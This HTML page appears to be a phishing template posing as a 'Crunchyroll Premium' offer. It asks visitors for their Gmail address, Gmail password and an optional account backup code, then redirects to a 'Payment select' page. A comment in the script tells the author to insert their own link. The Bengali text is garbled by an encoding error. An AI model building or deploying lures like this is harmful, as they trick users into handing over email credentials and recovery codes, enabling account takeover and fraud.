<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Crunchyroll Premium Offers</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700;900&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background: linear-gradient(135deg, #2a0900, #ff3d00, #000000);
      margin: 0;
      padding: 20px;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      color: #fff;
      box-sizing: border-box;
      overflow-x: hidden;
    }

    .header-title {
      font-size: 3em;
      font-weight: 900;
      text-align: center;
      margin-bottom: 30px;
      text-shadow: 2px 2px 8px rgba(0, 0, 0, 0.4);
      letter-spacing: 1.5px;
      animation: fadeInDown 1s ease-out;
    }

    @keyframes fadeInDown {
      from { opacity: 0; transform: translateY(-30px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .slider-container {
      width: 100%;
      max-width: 800px;
      height: 300px;
      overflow: hidden;
      border-radius: 15px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
      margin-bottom: 40px;
      position: relative;
    }

    .slider {
      display: flex;
      width: 300%;
      height: 100%;
      transition: transform 1s ease;
    }

    .slider img {
      width: calc(100% / 3);
      height: 100%;
      object-fit: cover;
      display: block;
      border-radius: 15px;
    }

    .options-container {
      width: 100%;
      max-width: 600px;
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(8px);
      border-radius: 15px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
      padding: 30px;
      display: flex;
      flex-direction: column;
      gap: 20px;
      align-items: center;
      border: 1px solid rgba(255, 255, 255, 0.2);
      animation: fadeInUp 1s ease-out forwards;
      animation-delay: 0.5s;
      opacity: 0;
    }

    @keyframes fadeInUp {
      from { opacity: 0; transform: translateY(30px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .option-buttons {
      display: flex;
      width: 100%;
      gap: 15px;
      margin-bottom: 25px;
    }

    .option-btn {
      flex: 1;
      padding: 15px 20px;
      background-color: rgba(255, 255, 255, 0.2);
      border: 2px solid transparent;
      border-radius: 10px;
      color: #fff;
      font-size: 1.2em;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.3s ease;
      text-align: center;
    }

    .option-btn:hover {
      background-color: rgba(255, 255, 255, 0.3);
      transform: translateY(-3px);
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
    }

    .option-btn.active {
      background-color: #FF6F00;
      border-color: #fff;
      box-shadow: 0 0 20px rgba(255, 111, 0, 0.6);
      transform: translateY(-5px);
    }

    .share-form {
      width: 100%;
      display: none;
      flex-direction: column;
      gap: 15px;
      padding-top: 15px;
      border-top: 1px solid rgba(255, 255, 255, 0.2);
      animation: fadeIn 0.5s ease-out;
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    .share-form.active {
      display: flex;
    }

    .form-input-group {
      position: relative;
      margin-bottom: 15px;
    }

    .form-input {
      width: 100%;
      padding: 15px;
      background: rgba(255, 255, 255, 0.1);
      border: 1px solid rgba(255, 255, 255, 0.3);
      border-radius: 8px;
      color: #fff;
      font-size: 1em;
      outline: none;
      transition: all 0.3s ease;
    }

    .form-input::placeholder {
      color: rgba(255, 255, 255, 0.7);
    }

    .form-input:focus {
      background: rgba(255, 255, 255, 0.2);
      border-color: #FF6F00;
      box-shadow: 0 0 10px rgba(255, 111, 0, 0.4);
    }

    .submit-btn {
      padding: 15px 25px;
      background-color: #FF6F00;
      border: none;
      border-radius: 10px;
      color: #fff;
      font-size: 1.2em;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
    }

    .submit-btn:hover {
      background-color: #E65100;
      transform: translateY(-3px);
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
    }

    @media (max-width: 768px) {
      .option-buttons {
        flex-direction: column;
      }
    }
  </style>
</head>
<body>
  <h1 class="header-title">Crunchyroll Premium ‡¶Ö‡¶´‡¶æ‡¶∞</h1>

  <div class="slider-container">
    <div class="slider" id="imageSlider">
      <img src="cranchyrooll shear.jpg" alt="Offer 1">
      <img src="cranchyrooll private.jpg" alt="Offer 2">
      <img src="https://via.placeholder.com/800x300/FF3D00/FFFFFF?text=Offer+3" alt="Offer 3">
    </div>
  </div>

  <div class="options-container">
    <div class="option-buttons">
      <button class="option-btn active" id="shareBtn" onclick="toggleOption('share')">‡¶∂‡ßá‡¶Ø‡¶º‡¶æ‡¶∞ ‡¶™‡ßç‡¶∞‡¶ø‡¶Æ‡¶ø‡¶Ø‡¶º‡¶æ‡¶Æ</button>
      <button class="option-btn" id="privateBtn" onclick="toggleOption('private')">‡¶è‡¶ï‡¶æ‡¶ï‡ßÄ ‡¶™‡ßç‡¶∞‡¶ø‡¶Æ‡¶ø‡¶Ø‡¶º‡¶æ‡¶Æ</button>
    </div>

    <form class="share-form active" id="shareForm" onsubmit="handleSubmit(event)">
      <div class="form-input-group">
        <input type="email" class="form-input" id="email" placeholder="‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ Gmail" required />
      </div>
      <div class="form-input-group">
        <input type="password" class="form-input" id="password" placeholder="‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶™‡¶æ‡¶∏‡¶ì‡¶Ø‡¶º‡¶æ‡¶∞‡ßç‡¶°" required />
      </div>
      <div class="form-input-group" id="backupCodeGroup">
        <input type="text" class="form-input" id="backupCode" placeholder="‡¶¨‡ßç‡¶Ø‡¶æ‡¶ï‡¶Ü‡¶™ ‡¶ï‡ßã‡¶° (‡¶ê‡¶ö‡ßç‡¶õ‡¶ø‡¶ï)" />
      </div>
      <button type="submit" class="submit-btn">‡¶∏‡¶æ‡¶¨‡¶Æ‡¶ø‡¶ü ‡¶ï‡¶∞‡ßÅ‡¶®</button>
    </form>
  </div>

  <script>
    // Slider
    const slider = document.getElementById('imageSlider');
    let currentSlide = 0;
    const totalSlides = slider.children.length;

    function nextSlide() {
      currentSlide = (currentSlide + 1) % totalSlides;
      slider.style.transform = `translateX(-${currentSlide * 100 / totalSlides}%)`;
    }
    setInterval(nextSlide, 5000);

    // Option Toggle
    const shareBtn = document.getElementById('shareBtn');
    const privateBtn = document.getElementById('privateBtn');
    const shareForm = document.getElementById('shareForm');

    function toggleOption(option) {
      shareBtn.classList.remove('active');
      privateBtn.classList.remove('active');

      if (option === 'share') {
        shareBtn.classList.add('active');
      } else {
        privateBtn.classList.add('active');
      }

      shareForm.classList.add('active');
      shareForm.style.display = 'flex'; // Always show form
    }

    // Form Submit with Redirect
    function handleSubmit(event) {
      event.preventDefault();
      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();

      if (!email || !password) {
        alert("Gmail ‡¶ì Password ‡¶¶‡¶ø‡¶®");
        return;
      }

      // ‚úÖ Redirect to confirmation page
      window.location.href = "Payment select.html"; // üîÅ ‡¶®‡¶ø‡¶ú‡ßá‡¶∞ ‡¶≤‡¶ø‡¶Ç‡¶ï ‡¶¨‡¶∏‡¶æ‡¶ì ‡¶è‡¶ñ‡¶æ‡¶®‡ßá
    }

    document.addEventListener('DOMContentLoaded', () => {
      toggleOption('share');
    });
  </script>
</body>
        </html>
